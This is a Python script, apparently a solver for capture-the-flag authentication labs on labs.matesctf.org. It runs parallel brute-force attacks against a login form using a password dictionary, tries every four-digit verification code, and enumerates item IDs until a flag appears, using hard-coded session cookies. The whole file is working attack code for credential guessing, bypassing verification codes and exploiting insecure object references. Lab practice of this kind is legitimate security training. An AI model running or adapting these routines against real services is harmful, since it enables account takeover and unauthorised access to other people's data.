from dictionary import *
import requests
from multiprocessing import Pool
from itertools import product


def send_login(username, password):
    url = 'https://labs.matesctf.org/lab/auth/3/index.php?page=login'

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    cookies = {'PHPSESSID': '5f5e839987072a9d4fbe8e08cd034d1f'}

    data = {'username': username,
            'password': password}

    response = requests.post(url=url,
                             headers=headers,
                             cookies=cookies,
                             data=data,
                             allow_redirects=False)

    # if response.text.find('username or password not correct') == -1:
    #     print((username, password))

    if response.status_code == 302:
        print((response.status_code, username, password))


def send_verify_code(code):
    url = 'https://labs.matesctf.org/lab/auth/6/index.php?page=verifyCode'

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    cookies = {'PHPSESSID': '5f5e839987072a9d4fbe8e08cd034d1f'}

    data = {'code': code}

    response = requests.post(url=url,
                             headers=headers,
                             cookies=cookies,
                             data=data,
                             allow_redirects=False)

    # print(response.text)
    if response.status_code == 302:
        print(code)


def get_item(item_id):
    url = 'https://labs.matesctf.org/lab/auth/2/index.php?page=item'

    headers = {}

    cookies = {'PHPSESSID': '459c190e6351d22bd129ca1535f724cb'}

    params = {'id': item_id}

    response = requests.get(url=url,
                            headers=headers,
                            cookies=cookies,
                            params=params,
                            allow_redirects=False)

    if response.text.find('Flag') != -1:
        print(item_id)


def brute_force():
    dictionary = get_dictionary()
    usernames, passwords = dictionary.usernames, dictionary.passwords

    with Pool(16) as p:
        p.starmap(send_login, product(['apollo'], passwords))


def brute_force_item():
    with Pool(16) as p:
        p.map(get_item, range(0, 1000))


def brute_force_code():
    with Pool(16) as p:
        p.map(send_verify_code, range(1000, 10000))


if __name__ == '__main__':
    brute_force_item()
